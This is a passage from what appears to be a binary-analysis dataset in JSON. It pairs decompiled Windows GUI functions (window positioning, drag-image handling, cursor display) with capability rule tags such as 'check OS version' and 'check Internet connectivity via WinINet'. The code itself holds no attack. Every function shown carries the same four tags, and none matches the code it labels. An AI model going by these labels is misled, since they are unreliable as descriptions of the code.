        "decompiled_code": "\nvoid __cdecl fcn.00440130(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x440152;\n    iVar2 = fcn.00403228();\n    uStack44 = 0x440226;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00403454();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.00413bc0();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.00413b64();\n            cVar1 = fcn.00403454();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1a4) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x44022d;\n    uStack44 = 0x440225;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 559
    },
    "0044033c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044033c(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_ECX;\n    uint *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 302
    },
    "004403c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004403c0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_59h;\n    int32_t var_55h;\n    int32_t var_51h;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.0044000c();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.0043ca38(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x8c))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_14h = in_EAX[0x12] - (var_55h - lprc);\n            var_18h = in_EAX[0x13] - (var_51h - var_59h);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - var_14h;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_18h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            var_10h = var_18h;\n            var_ch = var_14h;\n            iVar3 = fcn.0043ca38();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.0043c9fc();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.0044033c(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x440794 == (*(iVar4 + 0x61) & *0x440794)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    var_40h = ((var_55h - lprc) - *(iVar4 + 0x48)) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    var_44h = ((var_55h - lprc) + var_44h) - *(iVar4 + 0x48);\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x440798 == (*(iVar4 + 0x61) & *0x440798)) {\n                                cVar1 = '\\x01';\n                                if (0 < var_48h) {\n                                    var_48h = ((var_51h - var_59h) - *(iVar4 + 0x4c)) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    var_4ch = ((var_51h - var_59h) + var_4ch) - *(iVar4 + 0x4c);\n                                }\n                            }\n                            else {\n                                cVar1 = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                cVar1 = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                cVar1 = '\\x02';\n                            }\n                            else {\n                                cVar1 = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            var_30h = var_30h + *(iVar4 + 0x48);\n                            var_34h = var_34h + *(iVar4 + 0x48);\n                        }\n                        if (cVar1 - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (cVar1 - 1U == 2) {\n                            var_38h = var_38h + *(iVar4 + 0x4c);\n                            var_3ch = var_3ch + *(iVar4 + 0x4c);\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2095
    },
    "004407d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004407d8(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.0043b3f4();\n    cVar1 = fcn.004033e4();\n    if ((cVar1 != '\\0') && ((param_1 == '\\0' || (*(in_EAX + 0x158) == 0)))) {\n        fcn.00438e94();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00440850": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00440850(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack76 = 0x44086e;\n    piVar1 = fcn.0044000c();\n    if ((piVar1 != '\\0') && (piVar1 = in_EAX,  *(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack76 = 0x440894;\n            piVar1 = fcn.0043ca38();\n            if (piVar1 < 1) goto code_r0x00440a12;\n        }\n        puStack76 = 0x4408aa;\n        (**(*in_EAX + 0xb4))();\n        puStack76 = 0x4408b5;\n        (**(*in_EAX + 0x44))();\n        puStack76 = 0x4408c3;\n        (**(*in_EAX + 0x8c))();\n        puStack76 = 0x4408cb;\n        fcn.0043c5a0();\n        uStack80 = 0x44097f;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        iVar2 = fcn.0043ca38();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.0043c9fc();\n                if ((*(piVar1 + 0x57) != '\\0') || (((*(piVar1 + 7) & 0x10) != 0 && ((*(piVar1 + 0x51) & 4) == 0)))) {\n                    (**(*piVar1 + 0x84))(piVar1[0x13], piVar1[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack84;\n        puStack76 = 0x440986;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack80 = 0x44097e;\n        uVar3 = fcn.0043c5a8();\n        return uVar3;\n    }\ncode_r0x00440a12:\n    return piVar1 & 0xffffff00 | 1;\n}\n",
        "token_count": 669
    },
    "00440e9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00440e9c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0043862c();\n    uVar1 = fcn.0041d20c();\n    *(in_EAX + 0x160) = uVar1;\n    fcn.00438108();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 203
    },
    "00440f38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440f38(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(param_2 + 4) != 0) {\n        puStack16 = 0x440f5a;\n        fcn.0041d510();\n        uStack20 = 0x440fd3;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack28 = 0x440f79;\n        puStack16 = &stack0xfffffffc;\n        fcn.0041d884();\n        uStack32 = 0x440fb0;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        (**(*in_EAX + 0x8c))();\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x440fb7;\n        uStack32 = 0x440faf;\n        fcn.0041d884();\n        return;\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00441234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00441234(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4412bf;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + -0x10))();\n    if (*(in_EAX + 0x84) == '\\0') {\n        fcn.0043952c();\n        fcn.0041d664();\n        fcn.00438ce8();\n        fcn.0043952c();\n        fcn.0041d680();\n        fcn.00438d0c();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4412c6;\n    uStack24 = 0x4412be;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 241
    },
    "004412cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004412cc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar3 = param_2[3];\n    *(in_EAX + 0x84) = 1;\n    uStack56 = 0x4414a5;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.0043955c();\n    fcn.0043a778();\n    iVar1 = fcn.00456ef8();\n    if (iVar1 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.00456ef8();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar1 = fcn.00456f04();\n    if (iVar1 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.00456f04();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar1 = fcn.00456eec();\n    if (var_18h < iVar1) {\n        var_18h = fcn.00456eec();\n    }\n    iVar1 = fcn.00456ee0();\n    if (iVar3 + 4 < iVar1) {\n        fcn.00456ee0();\n    }\n    uVar2 = fcn.0043fd08(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar2);\n    iVar3 = sub.kernel32.dll_GetTickCount();\n    if (0xfa < iVar3 - var_4h[0x85]) {\n        iVar3 = fcn.00404268();\n        if ((iVar3 < 100) && (*0x461a88 != NULL)) {\n            sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n            if (var_8h != 0) {\n                sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n                if (var_8h == 0) {\n                    fcn.00444564();\n                    if (var_14h < var_1ch) {\n                        uVar4 = 0;\n                    }\n                    else {\n                        uVar4 = 1;\n                    }\n                }\n                else {\n                    uVar4 = 2;\n                }\n                uVar2 = fcn.0043fd08(100, *(uVar4 * 4 + 0x461b90) | 0x40000);\n                (**0x461a88)(uVar2);\n            }\n        }\n    }\n    fcn.0043d43c();\n    uVar2 = fcn.0043fd08(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x7c))();\n    *in_FS_OFFSET = uVar2;\n    iVar3 = sub.kernel32.dll_GetTickCount(0x4414ac);\n    var_4h[0x85] = iVar3;\n    *(var_4h + 0x84) = 0;\n    return;\n}\n",
        "token_count": 905
    },
    "00441734": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441734(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.00441620();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00441778": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441778(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.0044666c();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.004416ec(*(in_EAX + 0x74));\n        }\n        fcn.00441620();\n        uVar2 = fcn.004417d8(arg_8h);\n        if (uVar2 != '\\0') {\n            sub.user32.dll_ShowCursor(0);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 171
    },
    "0044183c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044183c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.0044666c();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "004418d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.004418d4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.0044666c();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.0044183c();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.00441734();\n        sub.user32.dll_ShowCursor(0xffffffff);\n    }\n    return bVar3;\n}\n",
        "token_count": 170
    },
    "0044191c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044191c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0043ba34();\n    uVar1 = fcn.0041d20c();\n    *(in_EAX + 0x208) = uVar1;\n    fcn.00438108();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 202
    },
    "00441a94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00441a94(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "00441bd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00441bd0(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack24;\n    uint uStack20;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.00442004();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x8c))();\n    if (param_2 == '\\x01') {\n        return uStack20;\n    }\n    if (param_2 == '\\x02') {\n        return uStack24;\n    }\n    return 0;\n}\n",
        "token_count": 268
    },
    "00441c3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00441c3c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.00441af0(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x8c))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack16 - iStack24;\n        }\n        else {\n            iVar2 = iStack20 - iStack28;\n        }\n    }\n    else {\n        do {\n            if (iVar2 == *(*(in_EAX + 0x1c) + 100)) {\n                if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n                    return *(*(in_EAX + 0x1c) + 0x68);\n                }\n                iVar2 = fcn.00442004();\n                return iVar2;\n            }\n            iVar2 = *(iVar2 + 0x14);\n        } while (param_2 != *(iVar2 + 0x10));\n        iVar2 = fcn.00442004();\n        iVar1 = fcn.00441b40();\n        iVar2 = iVar2 - iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 446
    },
    "00441cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00441cec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00441af0();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.00442104();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.00441c3c();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.00441c3c();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.00441af0();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.0044202c();\n            }\n            else {\n                fcn.00441b40();\n                fcn.0044202c();\n            }\n            fcn.00441e8c();\n            iVar1 = fcn.004420dc();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 289
    },
    "00441d94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00441d94(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00403fa8();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040b5f4();\n            fcn.004039e4();\n        }\n        fcn.00403ffc();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "00441dd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x00441e0d)\n\nuint32_t fcn.00441dd8(void)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00403454();\n    return uVar1 & 0xffffff00;\n}\n",
        "token_count": 99
    },
    "00441e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
